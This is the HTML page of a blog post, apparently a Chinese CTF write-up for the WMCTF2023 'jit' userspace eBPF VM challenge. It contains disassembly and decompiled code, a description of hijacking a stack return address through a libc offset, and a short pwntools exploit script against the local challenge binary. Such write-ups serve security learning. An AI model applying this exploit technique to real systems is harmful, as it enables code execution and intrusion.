@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="123456    Arch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabledFORTIFY:  Enabled  000055CBEA0D392C call vm_begin ; vm起始 输入program： 12345678910111">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WMCTF2023-jit-Userspace_eBPF_VM">
+<meta property="og:url" content="http://yushusu.github.io/2023/10/31/WMCTF2023-jit-Userspace-eBPF-VM/">
+<meta property="og:site_name" content="YUSHUSU">
+<meta property="og:description" content="123456    Arch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabledFORTIFY:  Enabled  000055CBEA0D392C call vm_begin ; vm起始 输入program： 12345678910111">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-10-30T16:18:32.000Z">
+<meta property="article:modified_time" content="2023-10-30T16:20:03.203Z">
+<meta property="article:author" content="yushusu">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>WMCTF2023-jit-Userspace_eBPF_VM</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/archives/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/yushusu">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/10/27/WMCTF2023-blindless/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yushusu.github.io/2023/10/31/WMCTF2023-jit-Userspace-eBPF-VM/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yushusu.github.io/2023/10/31/WMCTF2023-jit-Userspace-eBPF-VM/&text=WMCTF2023-jit-Userspace_eBPF_VM"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yushusu.github.io/2023/10/31/WMCTF2023-jit-Userspace-eBPF-VM/&title=WMCTF2023-jit-Userspace_eBPF_VM"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yushusu.github.io/2023/10/31/WMCTF2023-jit-Userspace-eBPF-VM/&is_video=false&description=WMCTF2023-jit-Userspace_eBPF_VM"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=WMCTF2023-jit-Userspace_eBPF_VM&body=Check out this article: http://yushusu.github.io/2023/10/31/WMCTF2023-jit-Userspace-eBPF-VM/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yushusu.github.io/2023/10/31/WMCTF2023-jit-Userspace-eBPF-VM/&title=WMCTF2023-jit-Userspace_eBPF_VM"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yushusu.github.io/2023/10/31/WMCTF2023-jit-Userspace-eBPF-VM/&title=WMCTF2023-jit-Userspace_eBPF_VM"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yushusu.github.io/2023/10/31/WMCTF2023-jit-Userspace-eBPF-VM/&title=WMCTF2023-jit-Userspace_eBPF_VM"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yushusu.github.io/2023/10/31/WMCTF2023-jit-Userspace-eBPF-VM/&title=WMCTF2023-jit-Userspace_eBPF_VM"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yushusu.github.io/2023/10/31/WMCTF2023-jit-Userspace-eBPF-VM/&name=WMCTF2023-jit-Userspace_eBPF_VM&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yushusu.github.io/2023/10/31/WMCTF2023-jit-Userspace-eBPF-VM/&t=WMCTF2023-jit-Userspace_eBPF_VM"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        WMCTF2023-jit-Userspace_eBPF_VM
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">yushusu</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-10-30T16:18:32.000Z" class="dt-published" itemprop="datePublished">2023-10-31</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
+
+<p>000055CBEA0D392C call vm_begin ; vm起始</p>
+<p>输入program：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">000055</span>CBEA0D529D loc_55CBEA0D529D:                       ; CODE XREF: load_opcode+D9↓j</span><br><span class="line">.text:<span class="number">000055</span>CBEA0D529D movsxd  rdi, r8d</span><br><span class="line">.text:<span class="number">000055</span>CBEA0D52A0 shl     rdi, <span class="number">3</span></span><br><span class="line">.text:<span class="number">000055</span>CBEA0D52A4 lea     rsi, [rbp+rdi+<span class="number">0</span>]                ; 输入的指令</span><br><span class="line">.text:<span class="number">000055</span>CBEA0D52A9 movzx   eax, byte ptr [rsi+<span class="number">1</span>]</span><br><span class="line">.text:<span class="number">000055</span>CBEA0D52AD movzx   r9d, byte ptr [rsi]             ; 高<span class="number">8</span></span><br><span class="line">.text:<span class="number">000055</span>CBEA0D52B1 mov     r11d, [rsi+<span class="number">4</span>]                   ; 低<span class="number">8</span></span><br><span class="line">.text:<span class="number">000055</span>CBEA0D52B5 mov     r10d, eax</span><br><span class="line">.text:<span class="number">000055</span>CBEA0D52B8 lea     ecx, [r9<span class="number">-4</span>]                     ; <span class="keyword">switch</span> <span class="number">219</span> cases</span><br><span class="line">.text:<span class="number">000055</span>CBEA0D52BC shr     al, <span class="number">4</span></span><br><span class="line">.text:<span class="number">000055</span>CBEA0D52BF <span class="keyword">and</span>     r10d, <span class="number">0F</span>h</span><br><span class="line">.text:<span class="number">000055</span>CBEA0D52C3 cmp     cl, <span class="number">0</span>DAh</span><br><span class="line">.text:<span class="number">000055</span>CBEA0D52C6 ja      def_55CBEA0D52D6                ; jumptable <span class="number">000055</span>CBEA0D52D6 <span class="keyword">default</span> <span class="keyword">case</span>, cases <span class="number">6</span>,<span class="number">8</span><span class="number">-11</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">16</span><span class="number">-19</span>,<span class="number">25</span><span class="number">-27</span>,<span class="number">32</span><span class="number">-35</span>,<span class="number">40</span><span class="number">-43</span>,<span class="number">48</span><span class="number">-51</span>,<span class="number">56</span><span class="number">-59</span>,<span class="number">64</span><span class="number">-67</span>,<span class="number">72</span><span class="number">-75</span>,<span class="number">80</span><span class="number">-83</span>,<span class="number">88</span><span class="number">-91</span>,<span class="number">96</span>,<span class="number">104</span>,<span class="number">112</span>,<span class="number">120</span>,<span class="number">128</span><span class="number">-131</span>,<span class="number">134</span>,<span class="number">136</span><span class="number">-147</span>,<span class="number">150</span>,<span class="number">152</span><span class="number">-155</span>,<span class="number">157</span>,<span class="number">158</span>,<span class="number">160</span><span class="number">-163</span>,<span class="number">168</span><span class="number">-171</span>,<span class="number">176</span><span class="number">-179</span>,<span class="number">184</span><span class="number">-187</span>,<span class="number">192</span><span class="number">-195</span>,<span class="number">200</span><span class="number">-203</span>,<span class="number">208</span><span class="number">-211</span>,<span class="number">215</span><span class="number">-219</span></span><br><span class="line">.text:<span class="number">000055</span>CBEA0D52C6</span><br></pre></td></tr></table></figure>
+
+<p>输入一个64位指令，格式是 p8(instrc), p8(reg), p16(offset), p32(immediate)</p>
+<p>进分支</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LABEL_9:</span><br><span class="line">        <span class="keyword">if</span> ( opcode &gt; <span class="number">0xA</span>u )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_47;</span><br><span class="line">        <span class="keyword">if</span> ( reg &gt; <span class="number">9u</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_26;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x7B</span>u:</span><br><span class="line">        <span class="keyword">if</span> ( opcode &gt; <span class="number">0xA</span>u )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_47;</span><br><span class="line">        <span class="keyword">if</span> ( reg &gt; <span class="number">9u</span> &amp;&amp; (<span class="built_in">BYTE1</span>(instruc[i_1]) &amp; <span class="number">0xF</span>) != <span class="number">10</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x85</span>u:</span><br><span class="line">        <span class="keyword">if</span> ( immediate &gt; <span class="number">0x3F</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          *a4 = <span class="built_in">sub_55CBEA0D4050</span>(<span class="string">&quot;invalid call immediate at PC %d&quot;</span>, i);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( !*(*(code + <span class="number">32</span>) + <span class="number">8LL</span> * immediate) )</span><br><span class="line">        &#123;</span><br><span class="line">          *a4 = <span class="built_in">sub_55CBEA0D4050</span>(<span class="string">&quot;call to nonexistent function %u at PC %d&quot;</span>, immediate, i);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br></pre></td></tr></table></figure>
+
+<p>分配堆</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">LABEL_12:</span><br><span class="line">          <span class="keyword">if</span> ( v9 &lt;= i )</span><br><span class="line">          &#123;</span><br><span class="line">            v19 = <span class="built_in">malloc</span>(code_len);</span><br><span class="line">            *code = v19;</span><br><span class="line">            <span class="keyword">if</span> ( v19 )</span><br><span class="line">            &#123;</span><br><span class="line">              *(code + <span class="number">8</span>) = v9;</span><br><span class="line">              <span class="keyword">do</span></span><br><span class="line">              &#123;</span><br><span class="line">                instruc_1 = *instruc;</span><br><span class="line">                code_len_2 = code_len_1++;</span><br><span class="line">                ++instruc;</span><br><span class="line">                <span class="built_in">sub_55CBEA0D5220</span>(code, code_len_2, instruc_1);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">while</span> ( *(code + <span class="number">8</span>) &gt; code_len_1 );</span><br><span class="line">              <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中sub_55CBEA0D5220</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_55CBEA0D5220</span><span class="params">(__int64 *code, <span class="type">unsigned</span> __int16 code_len, __int64 instruc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = *code;</span><br><span class="line">  *(*code + <span class="number">8LL</span> * code_len) = *code ^ code[<span class="number">10</span>] ^ instruc;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>and then .text:000055CBEA0D6A50 trans_opcode proc near</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">000055</span>CBEA0D95B3 mov     rsi, [rsp+<span class="number">38</span>h+len]              ; len</span><br><span class="line">.text:<span class="number">000055</span>CBEA0D95B7 <span class="keyword">xor</span>     r9d, r9d                        ; offset</span><br><span class="line">.text:<span class="number">000055</span>CBEA0D95BA mov     r8d, <span class="number">0F</span>FFFFFFFh                 ; fd</span><br><span class="line">.text:<span class="number">000055</span>CBEA0D95C0 <span class="keyword">xor</span>     edi, edi                        ; addr</span><br><span class="line">.text:<span class="number">000055</span>CBEA0D95C2 mov     ecx, <span class="number">22</span>h ; <span class="string">&#x27;&quot;&#x27;</span>                  ; flags</span><br><span class="line">.text:<span class="number">000055</span>CBEA0D95C7 mov     edx, <span class="number">3</span>                          ; prot</span><br><span class="line">.text:<span class="number">000055</span><span class="function">CBEA0D95CC call    _mmap</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">if</span> <span class="params">( v9 )</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">sub_55CBEA0D94E0</span>(a1, v9, len, a2) &lt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">free</span>(v10);</span><br><span class="line">          <span class="keyword">return</span> a1[<span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v11 = <span class="built_in">mmap</span>(<span class="number">0LL</span>, len[<span class="number">0</span>], <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">          v12 = v11;</span><br><span class="line">          <span class="keyword">if</span> ( v11 == <span class="number">-1LL</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v14 = __errno_location();</span><br><span class="line">            v15 = <span class="built_in">strerror</span>(*v14);</span><br><span class="line">            *a2 = <span class="built_in">sub_55CBEA0D4050</span>(<span class="string">&quot;internal jit error: mmap failed: %s\n&quot;</span>, v15);</span><br><span class="line">            <span class="built_in">free</span>(v10);</span><br><span class="line">            v6 = a1[<span class="number">2</span>];</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">memcpy</span>(v11, v10, len[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">if</span> ( <span class="built_in">mprotect</span>(v12, len[<span class="number">0</span>], <span class="number">5</span>) &lt; <span class="number">0</span> ) <span class="comment">//可读取和可执行，v12就是翻译过来的指令</span></span><br><span class="line">            &#123;</span><br><span class="line">              v16 = __errno_location();</span><br><span class="line">              v17 = <span class="built_in">strerror</span>(*v16);</span><br><span class="line">              v18 = <span class="built_in">sub_55CBEA0D4050</span>(<span class="string">&quot;internal jit error: mprotect failed: %s\n&quot;</span>, v17);</span><br><span class="line">              v6 = a1[<span class="number">2</span>];</span><br><span class="line">              *a2 = v18;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后指令根据libc 地址计算偏移来劫持栈上的返回地址</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add    eax,<span class="number">0xFFB77B01</span></span><br><span class="line">mov    DWORD PTR [rbp+<span class="number">0x138</span>],eax</span><br><span class="line">E4 <span class="number">5</span>D <span class="number">36</span> EA CA <span class="number">2</span>E B7 FF  <span class="number">83</span> <span class="number">57</span> <span class="number">0</span>E EB CB <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> =  </span><br><span class="line"><span class="number">55</span> <span class="number">53</span> <span class="number">41</span> <span class="number">55</span> <span class="number">41</span> <span class="number">56</span> <span class="number">41</span> <span class="number">57</span>  <span class="number">48</span> <span class="number">89</span> E5 <span class="number">48</span> <span class="number">81</span> EC <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>
+
+<p>exp:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">context.<span class="built_in">clear</span>(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">challenge = <span class="string">&#x27;./jit&#x27;</span></span><br><span class="line">p = <span class="built_in">process</span>(challenge)</span><br><span class="line"></span><br><span class="line">Program = \</span><br><span class="line">[</span><br><span class="line">    <span class="built_in">p8</span>(<span class="number">0</span>+<span class="number">4</span>), <span class="built_in">p8</span>(<span class="number">0</span>), <span class="built_in">p16</span>(<span class="number">0</span>), <span class="built_in">p32</span>(<span class="number">0xffab8069</span>+<span class="number">0xbfa98</span>), <span class="meta"># add    eax,0xFFB77B01</span></span><br><span class="line">    <span class="built_in">p8</span>(<span class="number">0x5f</span>+<span class="number">4</span>), <span class="built_in">p8</span>(<span class="number">10</span>), <span class="built_in">p16</span>(<span class="number">0x138</span>), <span class="built_in">p32</span>(<span class="number">0</span>),          <span class="meta"># mov    DWORD PTR [rbp+0x138],eax</span></span><br><span class="line">]</span><br><span class="line">p.<span class="built_in">sendafter</span>(b<span class="number">&#x27;</span>Program: <span class="string">&#x27;, binascii.b2a_hex(flat(Program)) + b&#x27;</span>\n<span class="number">&#x27;</span>)</span><br><span class="line">Memory = \</span><br><span class="line">[</span><br><span class="line">    <span class="number">0x58</span>,</span><br><span class="line">]</span><br><span class="line">p.<span class="built_in">sendafter</span>(b<span class="number">&#x27;</span>Memory: <span class="string">&#x27;, binascii.b2a_hex(flat(Memory)) + b&#x27;</span>\n<span class="number">&#x27;</span>)</span><br><span class="line">p.<span class="built_in">interactive</span>()</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/archives/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/yushusu">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yushusu.github.io/2023/10/31/WMCTF2023-jit-Userspace-eBPF-VM/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yushusu.github.io/2023/10/31/WMCTF2023-jit-Userspace-eBPF-VM/&text=WMCTF2023-jit-Userspace_eBPF_VM"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yushusu.github.io/2023/10/31/WMCTF2023-jit-Userspace-eBPF-VM/&title=WMCTF2023-jit-Userspace_eBPF_VM"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yushusu.github.io/2023/10/31/WMCTF2023-jit-Userspace-eBPF-VM/&is_video=false&description=WMCTF2023-jit-Userspace_eBPF_VM"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=WMCTF2023-jit-Userspace_eBPF_VM&body=Check out this article: http://yushusu.github.io/2023/10/31/WMCTF2023-jit-Userspace-eBPF-VM/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yushusu.github.io/2023/10/31/WMCTF2023-jit-Userspace-eBPF-VM/&title=WMCTF2023-jit-Userspace_eBPF_VM"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yushusu.github.io/2023/10/31/WMCTF2023-jit-Userspace-eBPF-VM/&title=WMCTF2023-jit-Userspace_eBPF_VM"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yushusu.github.io/2023/10/31/WMCTF2023-jit-Userspace-eBPF-VM/&title=WMCTF2023-jit-Userspace_eBPF_VM"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yushusu.github.io/2023/10/31/WMCTF2023-jit-Userspace-eBPF-VM/&title=WMCTF2023-jit-Userspace_eBPF_VM"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yushusu.github.io/2023/10/31/WMCTF2023-jit-Userspace-eBPF-VM/&name=WMCTF2023-jit-Userspace_eBPF_VM&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yushusu.github.io/2023/10/31/WMCTF2023-jit-Userspace-eBPF-VM/&t=WMCTF2023-jit-Userspace_eBPF_VM"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    yushusu
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/archives/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/yushusu">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
